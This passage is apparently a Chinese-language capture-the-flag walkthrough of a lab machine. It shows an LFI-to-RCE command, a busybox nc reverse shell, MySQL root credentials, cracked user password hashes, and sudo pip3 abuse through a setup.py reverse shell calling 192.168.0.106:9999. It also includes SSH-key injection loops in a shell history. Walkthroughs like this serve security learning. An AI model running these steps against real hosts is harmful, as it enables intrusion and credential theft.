python3 lfito_rce.py -l 'http://192.168.0.100/prices/filedownload.php?AssignmentForm=' --lhost 192.168.0.106 --lport 4444 -i 'http://192.168.0.100/phpsysinfo.php' 
```

我没成功



# 提权 
```plain
(remote) www-data@ephemeral:/etc/cron.d$ ps auxf
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           2  0.0  0.0      0     0 ?        S    05:41   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [rcu_gp]
root           4  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [rcu_par_gp]
root           6  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [kworker/0:0H-events_highpri]
root           9  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [mm_percpu_wq]
root          10  0.0  0.0      0     0 ?        I    05:41   0:00  \_ [rcu_tasks_kthread]
root          11  0.0  0.0      0     0 ?        I    05:41   0:00  \_ [rcu_tasks_rude_kthread]
root          12  0.0  0.0      0     0 ?        I    05:41   0:00  \_ [rcu_tasks_trace_kthread]
root          13  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [ksoftirqd/0]
root          14  0.0  0.0      0     0 ?        I    05:41   0:01  \_ [rcu_preempt]
root          15  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [migration/0]
root          16  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [idle_inject/0]
root          17  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [cpuhp/0]
root          18  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [cpuhp/1]
root          19  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [idle_inject/1]
root          20  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [migration/1]
root          21  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [ksoftirqd/1]
root          22  0.0  0.0      0     0 ?        I    05:41   0:02  \_ [kworker/1:0-events]
root          23  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [kworker/1:0H-events_highpri]
root          24  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [kdevtmpfs]
root          25  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [netns]
root          26  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [inet_frag_wq]
root          27  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [kauditd]
root          29  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [khungtaskd]
root          30  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [oom_reaper]
root          31  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [writeback]
root          32  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [kcompactd0]
root          33  0.0  0.0      0     0 ?        SN   05:41   0:00  \_ [ksmd]
root          34  0.0  0.0      0     0 ?        SN   05:41   0:00  \_ [khugepaged]
root          35  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [kintegrityd]
root          36  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [kblockd]
root          37  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [blkcg_punt_bio]
root          38  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [tpm_dev_wq]
root          39  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [ata_sff]
root          40  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [md]
root          41  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [edac-poller]
root          42  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [devfreq_wq]
root          43  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [watchdogd]
root          45  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [kworker/0:1H-kblockd]
root          46  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [kswapd0]
root          47  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [ecryptfs-kthread]
root          54  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [kthrotld]
root          58  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [acpi_thermal_pm]
root          59  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [vfio-irqfd-clea]
root          60  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [mld]
root          61  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [ipv6_addrconf]
root          66  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [kstrp]
root          72  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [zswap-shrink]
root          73  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [kworker/u5:0]
root         119  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [charger_manager]
root         158  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [kworker/1:1H-kblockd]
root         161  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [mpt_poll_0]
root         162  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [mpt/0]
root         163  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [scsi_eh_0]
root         164  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [scsi_tmf_0]
root         165  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [scsi_eh_1]
root         166  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [scsi_tmf_1]
root         167  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [scsi_eh_2]
root         168  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [scsi_tmf_2]
root         169  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [scsi_eh_3]
root         170  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [scsi_tmf_3]
root         171  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [scsi_eh_4]
root         172  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [scsi_tmf_4]
root         173  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [scsi_eh_5]
root         174  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [scsi_tmf_5]
root         175  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [scsi_eh_6]
root         176  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [scsi_tmf_6]
root         177  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [scsi_eh_7]
root         178  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [scsi_tmf_7]
root         179  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [scsi_eh_8]
root         180  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [scsi_tmf_8]
root         181  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [scsi_eh_9]
root         182  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [scsi_tmf_9]
root         183  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [scsi_eh_10]
root         184  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [scsi_tmf_10]
root         185  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [scsi_eh_11]
root         186  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [scsi_tmf_11]
root         187  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [scsi_eh_12]
root         188  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [scsi_tmf_12]
root         189  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [scsi_eh_13]
root         190  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [scsi_tmf_13]
root         191  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [scsi_eh_14]
root         192  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [scsi_tmf_14]
root         193  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [scsi_eh_15]
root         194  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [scsi_tmf_15]
root         195  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [scsi_eh_16]
root         196  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [scsi_tmf_16]
root         197  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [scsi_eh_17]
root         198  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [scsi_tmf_17]
root         199  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [scsi_eh_18]
root         200  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [scsi_tmf_18]
root         201  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [scsi_eh_19]
root         202  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [scsi_tmf_19]
root         203  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [scsi_eh_20]
root         204  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [scsi_tmf_20]
root         205  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [scsi_eh_21]
root         206  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [scsi_tmf_21]
root         207  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [scsi_eh_22]
root         208  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [scsi_tmf_22]
root         209  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [scsi_eh_23]
root         210  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [scsi_tmf_23]
root         211  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [scsi_eh_24]
root         212  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [scsi_tmf_24]
root         213  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [scsi_eh_25]
root         214  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [scsi_tmf_25]
root         215  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [scsi_eh_26]
root         216  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [scsi_tmf_26]
root         217  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [scsi_eh_27]
root         218  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [scsi_tmf_27]
root         219  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [scsi_eh_28]
root         220  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [scsi_tmf_28]
root         221  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [scsi_eh_29]
root         222  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [scsi_tmf_29]
root         252  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [scsi_eh_30]
root         253  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [scsi_tmf_30]
root         273  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [jbd2/sda5-8]
root         274  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [ext4-rsv-conver]
root         344  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [irq/18-vmwgfx]
root         347  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [card0-crtc0]
root         348  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [card0-crtc1]
root         349  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [card0-crtc2]
root         350  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [card0-crtc3]
root         351  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [card0-crtc4]
root         352  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [card0-crtc5]
root         353  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [card0-crtc6]
root         354  0.0  0.0      0     0 ?        S    05:41   0:00  \_ [card0-crtc7]
root         398  0.0  0.0      0     0 ?        I<   05:41   0:00  \_ [cryptd]
root        2303  0.0  0.0      0     0 ?        I    06:08   0:00  \_ [kworker/0:0-mpt_poll_0]
root        2431  0.0  0.0      0     0 ?        I    06:28   0:00  \_ [kworker/u4:2-events_power_efficien
root        2538  0.0  0.0      0     0 ?        I    06:41   0:00  \_ [kworker/0:1-cgroup_destroy]
root        2542  0.0  0.0      0     0 ?        I    06:42   0:00  \_ [kworker/u4:1-events_power_efficien
root        2559  0.0  0.0      0     0 ?        I    06:47   0:00  \_ [kworker/u4:0-events_unbound]
root        2691  0.0  0.0      0     0 ?        I    06:52   0:00  \_ [kworker/1:1-events]
root           1  0.0  0.6 168604 12472 ?        Ss   05:41   0:00 /sbin/init splash
root         314  0.0  0.8  51468 16644 ?        S<s  05:41   0:00 /lib/systemd/systemd-journald
root         338  0.0  0.3  24228  7520 ?        Ss   05:41   0:00 /lib/systemd/systemd-udevd
systemd+     597  0.0  0.6  23868 13080 ?        Ss   05:41   0:00 /lib/systemd/systemd-resolved
systemd+     600  0.0  0.2  90220  5972 ?        Ssl  05:41   0:00 /lib/systemd/systemd-timesyncd
root         628  0.0  0.0   2548   764 ?        Ss   05:41   0:00 /usr/sbin/acpid
root         630  0.0  0.1   8168  2468 ?        Ss   05:41   0:00 /usr/sbin/anacron -d -q -s
avahi        632  0.0  0.1   8532  3300 ?        Ss   05:41   0:00 avahi-daemon: running [ephemeral.local]
avahi        655  0.0  0.0   8348   328 ?        S    05:41   0:00  \_ avahi-daemon: chroot helper
root         633  0.0  0.1   9420  2764 ?        Ss   05:41   0:00 /usr/sbin/cron -f
root         635  0.0  0.4  28440  8600 ?        Ss   05:41   0:00 /usr/sbin/cupsd -l
lp           688  0.0  0.3  15332  6484 ?        S    05:41   0:00  \_ /usr/lib/cups/notifier/dbus dbus://
message+     636  0.0  0.2   7936  4652 ?        Ss   05:41   0:00 /usr/bin/dbus-daemon --system --address
root         638  0.0  1.0 264652 21076 ?        Ssl  05:41   0:00 /usr/sbin/NetworkManager --no-daemon
root         642  0.0  0.1  81832  3692 ?        Ssl  05:41   0:00 /usr/sbin/irqbalance --foreground
root         644  0.0  0.9  39328 20176 ?        Ss   05:41   0:00 /usr/bin/python3 /usr/bin/networkd-disp
root         646  0.0  0.4 236844  8904 ?        Ssl  05:41   0:00 /usr/lib/policykit-1/polkitd --no-debug
syslog       648  0.0  0.2 224352  4612 ?        Ssl  05:41   0:00 /usr/sbin/rsyslogd -n -iNONE
root         649  0.1  2.0 1923648 40836 ?       Ssl  05:41   0:05 /usr/lib/snapd/snapd
root         650  0.0  0.3  16556  7392 ?        Ss   05:41   0:00 /lib/systemd/systemd-logind
root         651  0.0  0.2  13684  4836 ?        Ss   05:41   0:00 /sbin/wpa_supplicant -u -s -O /run/wpa_
root         687  0.0  0.6 178392 12472 ?        Ssl  05:41   0:00 /usr/sbin/cups-browsed
root         699  0.0  0.5 314468 10836 ?        Ssl  05:41   0:00 /usr/sbin/ModemManager
root         713  0.0  1.1 118020 22972 ?        Ssl  05:41   0:00 /usr/bin/python3 /usr/share/unattended-
root         720  0.1  2.4 975776 50368 ?        Ssl  05:41   0:06 /usr/bin/containerd
root         721  0.0  0.1   6816  2924 ?        Ss   05:41   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf
root         729  0.0  0.0   8436  1748 tty1     Ss+  05:41   0:00 /sbin/agetty -o -p -- \u --noclear tty1
root         746  0.0  0.3  12180  6676 ?        Ss   05:41   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of
root         749  0.0  0.8 193444 17656 ?        Ss   05:41   0:00 /usr/sbin/apache2 -k start
www-data    2475  0.0  3.9 257496 80680 ?        S    06:34   0:01  \_ /usr/sbin/apache2 -k start
www-data    2480  0.0  0.8 194092 16256 ?        S    06:34   0:00  \_ /usr/sbin/apache2 -k start
www-data    2490  0.0  0.8 198704 17300 ?        S    06:35   0:00  \_ /usr/sbin/apache2 -k start
www-data    2494  0.0  0.8 194092 16368 ?        S    06:35   0:00  \_ /usr/sbin/apache2 -k start
www-data    2507  0.0  0.8 198712 17188 ?        S    06:36   0:00  \_ /usr/sbin/apache2 -k start
www-data    2510  0.0  0.8 198780 16788 ?        S    06:36   0:00  \_ /usr/sbin/apache2 -k start
www-data    2512  0.0  0.8 198756 16976 ?        S    06:36   0:00  \_ /usr/sbin/apache2 -k start
www-data    2513  0.0  0.8 197060 16892 ?        S    06:36   0:00  \_ /usr/sbin/apache2 -k start
www-data    2717  0.0  0.0   2616   592 ?        S    06:53   0:00  |   \_ sh -c busybox nc 192.168.0.106 
www-data    2718  0.0  0.1   3984  3004 ?        S    06:53   0:00  |       \_ bash
www-data    2738  0.0  0.0   2644  1948 ?        S    06:53   0:00  |           \_ /usr/bin/script -qc /us
www-data    2739  0.0  0.0   2616   524 pts/0    Ss   06:53   0:00  |               \_ sh -c /usr/bin/bash
www-data    2740  0.0  0.1   4248  3524 pts/0    S    06:53   0:00  |                   \_ /usr/bin/bash
www-data    2893  0.0  0.1   6224  3316 pts/0    R+   06:58   0:00  |                       \_ ps auxf
www-data    2514  0.0  0.7 193988 15944 ?        S    06:36   0:00  \_ /usr/sbin/apache2 -k start
www-data    2515  0.0  0.8 198736 16952 ?        S    06:36   0:00  \_ /usr/sbin/apache2 -k start
mysql        813  0.2 20.0 1797104 405600 ?      Ssl  05:41   0:12 /usr/sbin/mysqld
whoopsie     825  0.0  0.7 327168 15924 ?        Ssl  05:41   0:00 /usr/bin/whoopsie -f
kernoops     833  0.0  0.0  11260   444 ?        Ss   05:41   0:00 /usr/sbin/kerneloops --test
kernoops     836  0.0  0.0  11260   444 ?        Ss   05:41   0:00 /usr/sbin/kerneloops
root         854  0.0  4.3 873168 88144 ?        Ssl  05:41   0:01 /usr/bin/dockerd -H fd:// --containerd=
```

```plain
(remote) www-data@ephemeral:/etc/cron.d$ find / -name "*.cnf" -o -name "*.ini" 2>/dev/null | grep -i mysql
/usr/share/doc/mysql-server-8.0/examples/daemon_example.ini
/etc/mysql/my.cnf
/etc/mysql/.my.cnf
/etc/mysql/debian.cnf
/etc/mysql/mysql.cnf
/etc/mysql/mysql.conf.d/mysqld.cnf
/etc/mysql/mysql.conf.d/mysql.cnf
/etc/mysql/conf.d/mysqldump.cnf
/etc/mysql/conf.d/mysql.cnf
```

## mysql凭据
```plain
(remote) www-data@ephemeral:/etc/cron.d$ cat /etc/mysql/.my.cnf
[client]
user=root
password=RanDydBPa$$w0rd0987
```

尝试mysql提权失败了

翻找数据库

```plain
mysql> show databases;

+--------------------+
| Database           |
+--------------------+
| ephemeral_users    |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.01 sec)

mysql> use ephemeral_users;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+---------------------------+
| Tables_in_ephemeral_users |
+---------------------------+
| ephemeral_users           |
+---------------------------+
1 row in set (0.00 sec)

mysql> select * from ephemeral_users;
+--------+------------------------------------------+
| user   | password                                 |
+--------+------------------------------------------+
| kevin  | a7f30291fe998b2f188678090b40d8307ffdeddd |
| donald | 603ebcdd05c78c0a635b7b0846ef8ad5758b6d7c |
| jane   | 84f66bc55f616fe45b4d996896e4c9e4121264ef |
| randy  | d1b10494107b459a80df1e1d5b9b62bd0b24a1ce |
+--------+------------------------------------------+
4 rows in set (0.00 sec)

```

密码破解

```plain
kevin           jameskevingilmerjr
donald          24donaldson
jane            !pass_word
randy           !password!23
```

尝试登录

```plain
(remote) www-data@ephemeral:/etc/cron.d$ su kevin
Password: 
kevin@ephemeral:/etc/cron.d$ 
```

得到凭据kevin\jameskevingilmerjr

## 提权-donald
```plain
kevin@ephemeral:/$ sudo -l
[sudo] password for kevin: 
Matching Defaults entries for kevin on ephemeral:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User kevin may run the following commands on
        ephemeral:
    (donald) PASSWD: /usr/bin/pip3 install *

```



# 1. 创建包目录

```plain
cd /tmp
mkdir rev_shell
cd rev_shell
```



# 2. 创建setup.py

```plain
cat > setup.py << 'EOF'
import os, socket, subprocess, pty

lhost = "192.168.0.106"
lport = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((lhost, int(lport)))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
pty.spawn("/bin/bash")
EOF
```



# 3. 执行安装

```plain
sudo -u donald pip3 install .
```

# 4. 攻击机监听

```plain
(remote) donald@ephemeral:/home/donald$ ls
commands  Desktop  mypass.txt  note.txt
(remote) donald@ephemeral:/home/donald$ cat mypass.txt 
FjqSy9KKWgSdc65usJ7yoPNIokz
(remote) donald@ephemeral:/home/donald$ cat note.txt 
Hey Donald this is your system administrator. I left your new password in your home directory. 
Just remember to decode it.

Let me know if you need your password changed again.
```

```plain
https://www.dcode.fr/
https://www.dcode.fr/identification-chiffrement

分析出位base62
在经过base62解码后为nORMAniAntIcINacKLAi
```

![](https://cdn.nlark.com/yuque/0/2026/png/40628873/1768316857921-52d152ab-4fd7-418a-a791-d88f87facf86.png)

## 提权-jane
```plain
(remote) donald@ephemeral:/home/donald/commands$ history
 1010  ls -la 
 1011  rm -r id_rsa.pub\* 
 1012  clear
 1013  ls -la 
 1014  cd ..
 1015  ls -a l
 1016  rm -r keys/
 1017  clear
 1018  ls -al 
 1019  ls -la 
 1020  cd ..
 1021  cd shm/
 1022  ls -la 
 1023  su jane
 1024  clear
 1025  ls -]al 
 1026  clear
 1027  ls -la 
 1028  while true; do echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCubsM5Q4bRzpK+egPisoOymlHSesA/Ev9vAqzW/eG5DsMwam4HcoU/ERV2bgExwVAcCfX0fMvQ/kaHUTvSGVZrPJkUOG75tY8+TvmdIA4c/KQyFqac0X+0sL4P8Xm8aw8kwHG8z1asVc0Eo69lzhvbF1awXfIHcx3RS1WHKEH3ZBXngjCl/2PbucO55rWMffBvL7fxfvdxKtmZm59cmQfNxY+2+nHVoPKR4OBrVHvQcewBO37RPIDSuNsFvPQTztlQ5ahlNErKkbys+rbDKziI0fJXSD7/6gmlvBsdtTM+9QUrhbvkst0j3HpWT3dT8y9HwTBTLp/B4Ld8LRCXU53Eodb9Yl6pcgojDCnOc5+WvGC4u/Guapvp9qVlzAPgHK1SuWxLr8bsRbqZo+po81yyzpkFVzuJSEbjM9l8StvsQlCMEmso5lpYEP77G0m0jWgpSHzX3RhC5hQ5u/ddm/8e0bcclkx3iskbH0YgUxsYOdB9CHn78npmjfG3KzjJRvU= root@kali" | tee /dev/shm* > /dev/null; done
 1029  clear
 1030  while true; do echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCubsM5Q4bRzpK+egPisoOymlHSesA/Ev9vAqzW/eG5DsMwam4HcoU/ERV2bgExwVAcCfX0fMvQ/kaHUTvSGVZrPJkUOG75tY8+TvmdIA4c/KQyFqac0X+0sL4P8Xm8aw8kwHG8z1asVc0Eo69lzhvbF1awXfIHcx3RS1WHKEH3ZBXngjCl/2PbucO55rWMffBvL7fxfvdxKtmZm59cmQfNxY+2+nHVoPKR4OBrVHvQcewBO37RPIDSuNsFvPQTztlQ5ahlNErKkbys+rbDKziI0fJXSD7/6gmlvBsdtTM+9QUrhbvkst0j3HpWT3dT8y9HwTBTLp/B4Ld8LRCXU53Eodb9Yl6pcgojDCnOc5+WvGC4u/Guapvp9qVlzAPgHK1SuWxLr8bsRbqZo+po81yyzpkFVzuJSEbjM9l8StvsQlCMEmso5lpYEP77G0m0jWgpSHzX3RhC5hQ5u/ddm/8e0bcclkx3iskbH0YgUxsYOdB9CHn78npmjfG3KzjJRvU= root@kali" | tee /dev/shm/id_rsa.pub > /dev/null; done
 1031  clear
 1032  ls -la 
 1033  rm -r id_rsa.pub 
 1034  clear
 1035  while true; do echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCubsM5Q4bRzpK+egPisoOymlHSesA/Ev9vAqzW/eG5DsMwam4HcoU/ERV2bgExwVAcCfX0fMvQ/kaHUTvSGVZrPJkUOG75tY8+TvmdIA4c/KQyFqac0X+0sL4P8Xm8aw8kwHG8z1asVc0Eo69lzhvbF1awXfIHcx3RS1WHKEH3ZBXngjCl/2PbucO55rWMffBvL7fxfvdxKtmZm59cmQfNxY+2+nHVoPKR4OBrVHvQcewBO37RPIDSuNsFvPQTztlQ5ahlNErKkbys+rbDKziI0fJXSD7/6gmlvBsdtTM+9QUrhbvkst0j3HpWT3dT8y9HwTBTLp/B4Ld8LRCXU53Eodb9Yl6pcgojDCnOc5+WvGC4u/Guapvp9qVlzAPgHK1SuWxLr8bsRbqZo+po81yyzpkFVzuJSEbjM9l8StvsQlCMEmso5lpYEP77G0m0jWgpSHzX3RhC5hQ5u/ddm/8e0bcclkx3iskbH0YgUxsYOdB9CHn78npmjfG3KzjJRvU= root@kali" | tee /dev/shm/id_rsa.pub > /dev/null; done
 1036  ls -al 
 1037  while true; do echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCubsM5Q4bRzpK+egPisoOymlHSesA/Ev9vAqzW/eG5DsMwam4HcoU/ERV2bgExwVAcCfX0fMvQ/kaHUTvSGVZrPJkUOG75tY8+TvmdIA4c/KQyFqac0X+0sL4P8Xm8aw8kwHG8z1asVc0Eo69lzhvbF1awXfIHcx3RS1WHKEH3ZBXngjCl/2PbucO55rWMffBvL7fxfvdxKtmZm59cmQfNxY+2+nHVoPKR4OBrVHvQcewBO37RPIDSuNsFvPQTztlQ5ahlNErKkbys+rbDKziI0fJXSD7/6gmlvBsdtTM+9QUrhbvkst0j3HpWT3dT8y9HwTBTLp/B4Ld8LRCXU53Eodb9Yl6pcgojDCnOc5+WvGC4u/Guapvp9qVlzAPgHK1SuWxLr8bsRbqZo+po81yyzpkFVzuJSEbjM9l8StvsQlCMEmso5lpYEP77G0m0jWgpSHzX3RhC5hQ5u/ddm/8e0bcclkx3iskbH0YgUxsYOdB9CHn78npmjfG3KzjJRvU= root@kali" | tee /dev/shm/keys/id_rsa.pub* > /dev/null; done
 1038  cd /dev/shm/
 1039  ls -al 
 1040  cd keys/
 1041  ls 
 1042  touch file.txt
 1043  cd ..
 1044  cd /tmp/
 1045  cd t
 1046  cd test/
 1047  touch file.txt
 1048  cd ..
 1049  touch file.txt
 1050  rm -r 
 1051  rm -r file.txt 
 1052  cd t
 1053  cd test/
 1054  ls -al 
 1055  touch file.txt
 1056  cd /dev/shm/
 1057  ls -la 
 1058  cd keys/
 1059  ls 
 1060  cd..
 1061  clear
 1062  ls -al 
 1063  cd ..
 1064  ls -la 
 1065  rm -r keys/
 1066  while true; do echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCubsM5Q4bRzpK+egPisoOymlHSesA/Ev9vAqzW/eG5DsMwam4HcoU/ERV2bgExwVAcCfX0fMvQ/kaHUTvSGVZrPJkUOG75tY8+TvmdIA4c/KQyFqac0X+0sL4P8Xm8aw8kwHG8z1asVc0Eo69lzhvbF1awXfIHcx3RS1WHKEH3ZBXngjCl/2PbucO55rWMffBvL7fxfvdxKtmZm59cmQfNxY+2+nHVoPKR4OBrVHvQcewBO37RPIDSuNsFvPQTztlQ5ahlNErKkbys+rbDKziI0fJXSD7/6gmlvBsdtTM+9QUrhbvkst0j3HpWT3dT8y9HwTBTLp/B4Ld8LRCXU53Eodb9Yl6pcgojDCnOc5+WvGC4u/Guapvp9qVlzAPgHK1SuWxLr8bsRbqZo+po81yyzpkFVzuJSEbjM9l8StvsQlCMEmso5lpYEP77G0m0jWgpSHzX3RhC5hQ5u/ddm/8e0bcclkx3iskbH0YgUxsYOdB9CHn78npmjfG3KzjJRvU= root@kali" | tee /dev/shm/keys* > /dev/null; done
 1067  while true; do echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCubsM5Q4bRzpK+egPisoOymlHSesA/Ev9vAqzW/eG5DsMwam4HcoU/ERV2bgExwVAcCfX0fMvQ/kaHUTvSGVZrPJkUOG75tY8+TvmdIA4c/KQyFqac0X+0sL4P8Xm8aw8kwHG8z1asVc0Eo69lzhvbF1awXfIHcx3RS1WHKEH3ZBXngjCl/2PbucO55rWMffBvL7fxfvdxKtmZm59cmQfNxY+2+nHVoPKR4OBrVHvQcewBO37RPIDSuNsFvPQTztlQ5ahlNErKkbys+rbDKziI0fJXSD7/6gmlvBsdtTM+9QUrhbvkst0j3HpWT3dT8y9HwTBTLp/B4Ld8LRCXU53Eodb9Yl6pcgojDCnOc5+WvGC4u/Guapvp9qVlzAPgHK1SuWxLr8bsRbqZo+po81yyzpkFVzuJSEbjM9l8StvsQlCMEmso5lpYEP77G0m0jWgpSHzX3RhC5hQ5u/ddm/8e0bcclkx3iskbH0YgUxsYOdB9CHn78npmjfG3KzjJRvU= root@kali" | tee /dev/shm/keys/id_rsa.pub* > /dev/null; done
 1068  while true; do echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCubsM5Q4bRzpK+egPisoOymlHSesA/Ev9vAqzW/eG5DsMwam4HcoU/ERV2bgExwVAcCfX0fMvQ/kaHUTvSGVZrPJkUOG75tY8+TvmdIA4c/KQyFqac0X+0sL4P8Xm8aw8kwHG8z1asVc0Eo69lzhvbF1awXfIHcx3RS1WHKEH3ZBXngjCl/2PbucO55rWMffBvL7fxfvdxKtmZm59cmQfNxY+2+nHVoPKR4OBrVHvQcewBO37RPIDSuNsFvPQTztlQ5ahlNErKkbys+rbDKziI0fJXSD7/6gmlvBsdtTM+9QUrhbvkst0j3HpWT3dT8y9HwTBTLp/B4Ld8LRCXU53Eodb9Yl6pcgojDCnOc5+WvGC4u/Guapvp9qVlzAPgHK1SuWxLr8bsRbqZo+po81yyzpkFVzuJSEbjM9l8StvsQlCMEmso5lpYEP77G0m0jWgpSHzX3RhC5hQ5u/ddm/8e0bcclkx3iskbH0YgUxsYOdB9CHn78npmjfG3KzjJRvU= root@kali" | tee /dev/shm/keys/id_rsa.pub > /dev/null; done
